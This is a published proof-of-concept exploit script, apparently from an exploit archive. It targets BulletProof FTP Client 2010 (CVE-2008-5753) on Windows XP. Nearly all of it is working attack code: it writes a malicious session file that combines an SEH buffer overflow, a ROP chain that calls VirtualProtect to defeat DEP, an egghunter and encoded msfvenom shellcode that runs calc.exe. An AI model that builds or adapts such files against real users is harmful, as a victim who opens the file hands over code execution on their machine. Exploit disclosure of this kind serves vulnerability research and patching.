# Exploit Title: BulletProof FTP Client 2010 - Buffer Overflow (SEH)          #
# Date: Feb 15 2015                                                           #
# Exploit Author: Gabor Seljan                                                #
# Software Link: http://www.bpftp.com/                                        #
# Version: 2010.75.0.76                                                       #
# Tested on: Windows XP SP3 English                                           #
# Credits: His0k4                                                             #
# CVE: CVE-2008-5753                                                          #
#-----------------------------------------------------------------------------#
 
#!/usr/bin/python
 
from struct import pack
 
# offset to SEH is 93 byte
buf  = b&#039;A&#039; * 13
buf += pack(&#039;<L&#039;,0x77c1f62f)          # POP ECX # POP ECX # POP EDI # POP EBX # POP EBP # RETN [msvcrt.dll]
buf += b&#039;A&#039; * 20
buf += pack(&#039;<L&#039;,0x74c86a99)          # POP ESI # RETN [oleacc.dll]
buf += b&#039;A&#039; * 4
buf += pack(&#039;<L&#039;,0x77c4dca8)          # ADD ESP,2C # RETN [msvcrt.dll]
buf += b&#039;A&#039; * 18
buf += pack(&#039;<L&#039;,0x77c1c47f)          # POP EBX # POP EBP # RETN 10 [msvcrt.dll]
buf += b&#039;A&#039; * 8
buf += pack(&#039;<L&#039;,0x74c86a9a)          # RETN [oleacc.dll]
buf += b&#039;A&#039; * 10
buf += b&#039;\xce\xc3\x40&#039;                # ADD ESP,400 # POP ESI # POP EBX # RETN [bpftpclient.exe]
 
# ROP chain
rop_gadgets  = b&#039;&#039;
rop_gadgets += pack(&#039;<L&#039;,0x77c364d5)  # POP EBP # RETN [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c364d5)  # skip 4 bytes [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c21d16)  # POP EAX # RETN [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0xfffffafe)  # Value to negate, will become 0x00000501
rop_gadgets += pack(&#039;<L&#039;,0x7ca82222)  # NEG EAX # RETN [shell32.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77227494)  # XCHG EAX,EBX # RETN [WININET.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c21d16)  # POP EAX # RETN [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0xffffffc0)  # Value to negate, will become 0x00000040
rop_gadgets += pack(&#039;<L&#039;,0x771bcbe4)  # NEG EAX # RETN [WININET.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77f124c8)  # XCHG EAX,EDX # RETN [GDI32.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c2c343)  # POP ECX # RETN [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c605b5)  # &Writable location [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c23b47)  # POP EDI # RETN [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c39f92)  # RETN (ROP NOP) [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c34d9a)  # POP ESI # RETN [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c2aacc)  # JMP [EAX] [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c21d16)  # POP EAX # RETN [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c11120)  # ptr to &VirtualProtect() [IAT msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c12df9)  # PUSHAD # RETN [msvcrt.dll]
rop_gadgets += pack(&#039;<L&#039;,0x77c35524)  # ptr to &#039;push esp #  ret &#039; [msvcrt.dll]
 
 
# heap-only egghunter
hunter  = b&#039;\x6a\x30\x5a&#039;             # PUSH 30 # POP EDX
hunter += b&#039;\x64\x8b\x12&#039;             # MOV EDX, DWORD PTR FS:[EDX]
hunter += b&#039;\x80\xc2\x90&#039;             # ADD DL,90
hunter += b&#039;\x8b\x12&#039;                 # MOV EDX, DWORD PTR [EDX]
hunter += b&#039;\x8b\x12&#039;                 # MOV EDX, DWORD PTR [EDX]
hunter += b&#039;\xeb\x05&#039;                 # JMP SHORT
hunter += b&#039;\x66\x81\xca\xff\x0f&#039;     # OR DX,0FFF
hunter += b&#039;\x42\x52&#039;                 # INC EDX # PUSH EDX
hunter += b&#039;\x6a\x02\x58&#039;             # PUSH 2 # POP EAX
hunter += b&#039;\xcd\x2e&#039;                 # INT 2E
hunter += b&#039;\x3c\x05&#039;                 # CMP AL,5
hunter += b&#039;\x5a&#039;                     # POP EDX
hunter += b&#039;\x74\xef&#039;                 # JE SHORT
hunter += b&#039;\xb8\x77\x30\x30\x74&#039;     # MOV EAX, w00t
hunter += b&#039;\x89\xd7&#039;                 # MOV EDI,EDX
hunter += b&#039;\xaf&#039;                     # SCAS DWORD PTR ES:[EDI]
hunter += b&#039;\x75\xea&#039;                 # JNZ SHORT
hunter += b&#039;\xaf&#039;                     # SCAS DWORD PTR ES:[EDI]
hunter += b&#039;\x75\xe7&#039;                 # JNZ SHORT
 
# copy shellcode back to stack
strcpy  = b&#039;\x8b\xec&#039;                 # MOV EBP,ESP
strcpy += b&#039;\x57\x55\x55&#039;             # PUSH EDI # PUSH EBP # PUSH EBP
strcpy += b&#039;\x68\x30\x60\xc4\x77&#039;     # PUSH ptr to &strcpy [msvcrt.dll]
strcpy += b&#039;\xc3&#039;                     # RET
 
egg = &#039;w00t&#039;.encode()
 
# msfvenom -p windows/exec -b &#039;\x00\x0d\x0a\x1a&#039; -e x86/shikata_ga_nai cmd=calc.exe
shellcode  = b&#039;&#039;
shellcode += b&#039;\xdb\xd1\xb8\xda\x92\x2c\xca\xd9\x74\x24\xf4\x5a\x31&#039;
shellcode += b&#039;\xc9\xb1\x31\x83\xc2\x04\x31\x42\x14\x03\x42\xce\x70&#039;
shellcode += b&#039;\xd9\x36\x06\xf6\x22\xc7\xd6\x97\xab\x22\xe7\x97\xc8&#039;
shellcode += b&#039;\x27\x57\x28\x9a\x6a\x5b\xc3\xce\x9e\xe8\xa1\xc6\x91&#039;
shellcode += b&#039;\x59\x0f\x31\x9f\x5a\x3c\x01\xbe\xd8\x3f\x56\x60\xe1&#039;
shellcode += b&#039;\x8f\xab\x61\x26\xed\x46\x33\xff\x79\xf4\xa4\x74\x37&#039;
shellcode += b&#039;\xc5\x4f\xc6\xd9\x4d\xb3\x9e\xd8\x7c\x62\x95\x82\x5e&#039;
shellcode += b&#039;\x84\x7a\xbf\xd6\x9e\x9f\xfa\xa1\x15\x6b\x70\x30\xfc&#039;
shellcode += b&#039;\xa2\x79\x9f\xc1\x0b\x88\xe1\x06\xab\x73\x94\x7e\xc8&#039;
shellcode += b&#039;\x0e\xaf\x44\xb3\xd4\x3a\x5f\x13\x9e\x9d\xbb\xa2\x73&#039;
shellcode += b&#039;\x7b\x4f\xa8\x38\x0f\x17\xac\xbf\xdc\x23\xc8\x34\xe3&#039;
shellcode += b&#039;\xe3\x59\x0e\xc0\x27\x02\xd4\x69\x71\xee\xbb\x96\x61&#039;
shellcode += b&#039;\x51\x63\x33\xe9\x7f\x70\x4e\xb0\x15\x87\xdc\xce\x5b&#039;
shellcode += b&#039;\x87\xde\xd0\xcb\xe0\xef\x5b\x84\x77\xf0\x89\xe1\x88&#039;
shellcode += b&#039;\xba\x90\x43\x01\x63\x41\xd6\x4c\x94\xbf\x14\x69\x17&#039;
shellcode += b&#039;\x4a\xe4\x8e\x07\x3f\xe1\xcb\x8f\xd3\x9b\x44\x7a\xd4&#039;
shellcode += b&#039;\x08\x64\xaf\xb7\xcf\xf6\x33\x16\x6a\x7f\xd1\x66&#039;
 
identifier = b&#039;This is a BulletProof FTP Client Session-File and should not be modified directly.&#039;
host       = buf
port       = b&#039;21&#039;
name       = b&#039;B&#039; + rop_gadgets + hunter + strcpy
password   = b&#039;bpfmcidchffddknejf&#039;
local      = egg + egg + shellcode
 
sploit     = b"\r\n".join([identifier, host, port, name, password, local])
 
try:
  print(&#039;[*] Creating exploit file...&#039;)
  f = open(&#039;sploit.bps&#039;, &#039;wb&#039;)
  f.write(sploit)
  f.close()
  print(&#039;[*] sploit.bps file successfully created!&#039;)
except:
  print(&#039;[!] Error while creating exploit file!&#039;)

